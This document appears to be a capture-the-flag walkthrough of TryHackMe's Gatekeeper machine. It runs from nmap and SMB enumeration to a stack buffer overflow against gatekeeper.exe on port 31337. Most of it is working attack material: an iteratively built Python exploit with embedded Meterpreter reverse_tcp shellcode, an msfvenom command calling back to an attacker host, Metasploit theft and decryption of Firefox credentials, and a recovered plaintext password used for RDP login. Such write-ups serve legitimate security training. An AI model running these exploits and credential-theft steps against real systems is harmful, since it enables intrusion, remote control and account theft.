# Gatekeeper Walkthrough

## Nmap

Let's first scan machine ip with nmap, we are going to divide nmap scan in two section initial scan and final scan.
* In Initial scan we are going to cover nmap fast scan of ports and other things.
* In Final scan we are going to cover nmap full port scan with vuln script.

**Nmap Initial Scan**

command=>

```sudo nmap -F -sV 10.10.182.96 -oN nmap-initial-scan.txt```

Result => 

![nmap-initial-scan](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/nmap-initial-scan.png)

### Nmap final scan

command=>

```sudo nmap -A -O -v --script vuln 10.10.182.96 -oN nmap-final-scan.txt```

Result=>

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49167/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=7%D=7/4%Time=62C2FF28%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(
SF:SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20V
SF:ia:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@nm
SF:>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:\
SF:x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forwa
SF:rds:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:\
SF:x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x2
SF:0\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTTP
SF:Options,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")
SF:%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\r
SF:!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\x
SF:16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSessi
SF:onReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Four
SF:OhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01def
SF:ault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/4%OT=135%CT=1%CU=33023%PV=Y%DS=2%DC=T%G=Y%TM=62C2FFF
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7
OS:)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M50
OS:5NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=80%CD=Z)

Uptime guess: 0.036 days (since Mon Jul  4 19:36:01 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   155.73 ms 10.8.0.1 (10.8.0.1)
2   213.31 ms 10.10.182.96 (10.10.182.96)
```

Here after completing nmap scan we found lots of ports but my eyes goes first in smb ports, So let's start enumeration.

## Smb Enumeration
so i use nmap script (smb-enum-shares.nse, smb-enum-users.nse) for enumerating samba.

command=>

```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.182.96 | tee nmap-smb-share-enum.txt```

Result=>

![nmap-smb-share-enum](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/nmap-smb-share-enum.png)

so here we found shares then i try to access Users share using smbclient.

## Accessing Samba Users Share
command=>

```smbclient //10.10.182.96/Users```

Result=>

![smbclient-User-access](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/smbclient-User-access.png)

we are able to access Users, In this share i found two directory one is default and other is  Share. I go inside the Share directory and list the file and found gatekeeper.exe file.

![gatekeeper-found](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/gatekeeper-found.png)

Using mget i download this file in my local system.

command=>

```mget gatekeeper.exe```

and it download the file in my current directory.

Now i upload this file to my windows virtual machine using usb you can also use python http server, where i pre installed everytool we are going to use like immunity debugger etc.

## Fuzzing
so now first i load gatekeeper.exe in immunity debugger and in our kali machine using netcat i try to connect with gatekeeper.exe on port 31337.

after connecting i enter some random text and on the output it shows Hello textweenter!!!

![nc-connect](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/nc-connect.png)

Then using python i create 300 A's and try to enter this after entering this we found program got crash and register fill with bunch of A's i.e, 41

![nc-crash](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/nc-crash.png)

POC of program crash=>

![fuzzing-crash-1](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/fuzzing-crash-1.png)

POC of register fill with A's (41)

![fuzzing-register41-2](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/fuzzing-register41-2.png)

Now the next step is to identify which part of the buffer that is being sent landing in the EIP register, in order to control the execution flow. For this we are going to use pattern_create.rb script.

command=>

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300```

and it gives us 300 byte string.

## Creating exploit

So now for using the 300 byte string and future work we need to create a exploit.

code=>

```
import socket

ip = "192.168.226.129"
port = 31337

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

we create this script by modifying the exploit we got in  [BufferOverflow Prep](https://tryhackme.com/room/bufferoverflowprep) room on TryHackMe.

so let's understand what this script do.

in the first line we import a python library named as socket then we create two variable name ip and port, and set them to our target value after this we create some other variable we going to need in future work.  In payload variable we specify our 300 byte string created by pattern_create.rb. Then we create a variable name buffer and add all of other variable inside this variable. Using socket we tell that we are going to use ip and port, then i use s.connect for connecting to our target and then print out a string . Then using s.send we send buffer amount in bytes after completeing the task it print out done, in the mean time if crash occur or script stop working then our program print  our Could not connect.
So lets use this script, before using this restart the Immunity Debugger and re-attach gatekeeper.exe script.

Execute the script using command=>

```python3 exploit.py```

after executing the script we saw something like this

![pattern_create.png](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/pattern_create.png)

and when we see in our  Immunity Debugger we found application got crashed.

## Offset

Using mona to calculate the EIP offset, using command :

```!mona findmsp -distance 300```

Output :

![offset-mona-3](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/offset-mona-3.png)

There are other method too for finding offset i.e, using pattern_offset.rb script.

command=>

```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 39654138```

here -l is length  and -q  is query , query is EIP value we got after using above script.

Using this script it shows the offset in just few seconds as you can see in the below image.

![pattern_offset](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/pattern_offset.png)

The reason behind doing this step is to verify is there enough space for the shellcode immediately after EIP,  which is what will be executed by the system in order to gain remote access. 
Now lets update the script.

code=>

```
import socket

ip = "192.168.226.129"
port = 31337

offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "C" * 400

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Here we update offset value to what we find earlier then we add 4 B's in retn and 400 C's in payload.
Restart Immunity Debugger and re-attach gatekeeper and run the script again.
Now this time we can see EIP point to 42424242 which is 4 B's and all the 400 bytes of C's we send are successfully overwrite ESP register. This means an ESP JMP address can be used to redirect the execution to ESP, which will contain the malicious shellcode.

POC of script work=>

![ID-5](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/ID-5.png)

![EIP-BBBB-4](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/EIP-BBBB-4.png)

![python400](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/python400.png)

On above and below image show ESP contain 400 C's we find these address on immunity debugger stack as given below.

![addrs1-6](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/addrs1-6.png)

![addrs1-7](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/addrs1-7.png)

## Bad Chars

Lets create a byte array to test for bad characters.

command=>

```!mona bytearray -b "\x00"```

enter above command in immunity debugger in crash state as we all know \x00 is always in bad char that's why we specify this.

![bytearray00](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/bytearray00.png)

Now i do a google search for bad chars and found all possible bad character i got a [reddit](https://www.reddit.com/r/python_netsec/comments/57gswn/generate_all_hex_chars_to_find_badchars/) page that have all bad char listed with a script too.

![hex_badchar](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/hex_badchar.png)

copy the all bad char or use the script to genrate bad char and set in payload variable in out exploit.py script we created before remember if you copy the bad char then it contains space may be they give us some issue. In my case i am using python script we got on reddit for generating bad char.

![badchar_result](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/badchar_result.png)

Updated script=>

```
import socket

ip = "192.168.226.129"
port = 31337

offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  ```

Restart the Immunity Debugger and re-attach gatekeeper script and run the script.

![ESP-addrs-findbadchar](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/ESP-addrs-findbadchar.png)

The program got crashed check for bad char using below command on immunity debugger.

```!mona compare -f "C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a 00a719e4```

here,
-f is used for file where we genrate bytearray before .
-a is used for specify ESP address.

![got-bad-char](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/got-bad-char.png)

Here we found bad char 00 and 0a.
Now the next step is find a valid JMP ESP instruction address so that we can redirect the execution of the application to our malicious shellcode.

Restart the Immunity debugger and re-attach gatekeeper and using mona module we find a valid DLL/module 

command=>

```!mona jmp -r esp -cpb "\x00\x0a"```

found DLL/module=>

![dll-found](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/dll-found.png)

look like there are two possible JMP ESP address
set any one of the address to our exploit.py script in retn field on padding add nop (\x90) and generate a shell code using python.

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c```

and copy and paste the shell code in the payload field.

Then our script look like this:

```
import socket

ip = "192.168.226.129"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 13
payload = ("\xdd\xc4\xba\xa7\x39\x0e\x3e\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x13\x03\xf1\x2a\xec\xcb\x01\xa4\x72"
"\x33\xf9\x35\x13\xbd\x1c\x04\x13\xd9\x55\x37\xa3\xa9\x3b\xb4"
"\x48\xff\xaf\x4f\x3c\x28\xc0\xf8\x8b\x0e\xef\xf9\xa0\x73\x6e"
"\x7a\xbb\xa7\x50\x43\x74\xba\x91\x84\x69\x37\xc3\x5d\xe5\xea"
"\xf3\xea\xb3\x36\x78\xa0\x52\x3f\x9d\x71\x54\x6e\x30\x09\x0f"
"\xb0\xb3\xde\x3b\xf9\xab\x03\x01\xb3\x40\xf7\xfd\x42\x80\xc9"
"\xfe\xe9\xed\xe5\x0c\xf3\x2a\xc1\xee\x86\x42\x31\x92\x90\x91"
"\x4b\x48\x14\x01\xeb\x1b\x8e\xed\x0d\xcf\x49\x66\x01\xa4\x1e"
"\x20\x06\x3b\xf2\x5b\x32\xb0\xf5\x8b\xb2\x82\xd1\x0f\x9e\x51"
"\x7b\x16\x7a\x37\x84\x48\x25\xe8\x20\x03\xc8\xfd\x58\x4e\x85"
"\x32\x51\x70\x55\x5d\xe2\x03\x67\xc2\x58\x8b\xcb\x8b\x46\x4c"
"\x2b\xa6\x3f\xc2\xd2\x49\x40\xcb\x10\x1d\x10\x63\xb0\x1e\xfb"
"\x73\x3d\xcb\xac\x23\x91\xa4\x0c\x93\x51\x15\xe5\xf9\x5d\x4a"
"\x15\x02\xb4\xe3\xbc\xf9\x5f\xcc\xe9\xe3\x20\xa4\xeb\xe3\x31"
"\x69\x65\x05\x5b\x81\x23\x9e\xf4\x38\x6e\x54\x64\xc4\xa4\x11"
"\xa6\x4e\x4b\xe6\x69\xa7\x26\xf4\x1e\x47\x7d\xa6\x89\x58\xab"
"\xce\x56\xca\x30\x0e\x10\xf7\xee\x59\x75\xc9\xe6\x0f\x6b\x70"
"\x51\x2d\x76\xe4\x9a\xf5\xad\xd5\x25\xf4\x20\x61\x02\xe6\xfc"
"\x6a\x0e\x52\x51\x3d\xd8\x0c\x17\x97\xaa\xe6\xc1\x44\x65\x6e"
"\x97\xa6\xb6\xe8\x98\xe2\x40\x14\x28\x5b\x15\x2b\x85\x0b\x91"
"\x54\xfb\xab\x5e\x8f\xbf\xcc\xbc\x05\xca\x64\x19\xcc\x77\xe9"
"\x9a\x3b\xbb\x14\x19\xc9\x44\xe3\x01\xb8\x41\xaf\x85\x51\x38"
"\xa0\x63\x55\xef\xc1\xa1")

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

now setup a netcat listner and start the application without the debugger and after executing the script we got shell.

POC=>

![program-without-debugger](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/program-without-debugger.png)

![shell](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/shell.png)

Now need to use this exploit on tryhackme machine create a new shellcode using msfvenom and specify your tun0 ip. copy the code and paste in exploit.py script don't forget to change ip to machine ip. Now start msfconsole and set payload and multi handler for connection.

![msfconsole](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/msfconsole.png)

After running our exploit.py we got connection back to our handler.

![shell_real](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/shell_real.png)

We got a shell of user name natbat.

## Privilege Escalation

While performing enumeration of common files and folders, found out that Mozilla Firefox is installed on the box, so decided to use Metasploit to extract browser credentials.
so first i background the current session using 'background' command and then using '/post/multi/gather/firefox_creds'  

![firefox_msfconsole](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/firefox_msfconsole.png)

then i  set the session number and again run the exploit.

![firefox_creds](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/firefox_creds.png)

using [this](https://github.com/unode/firefox_decrypt) GitHub repository, credentials stored by Firefox can be decrypted.

![file](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/file.png)

Then using the tool we download we decrypt the files and found username and password.

![root_creds](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/root_creds.png)

Using xfreerdp we connect the windows machine using command

```sudo xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.239.3```

and found root.txt.

![root](https://raw.githubusercontent.com/SUNNYSAINI01001/Gatekeeper/main/Screenshot/root.png)

### Booomm!! Machine Solved

![party](https://c.tenor.com/qe5OcoH-VxsAAAAC/funny-dance-indian-man-dance.gif)
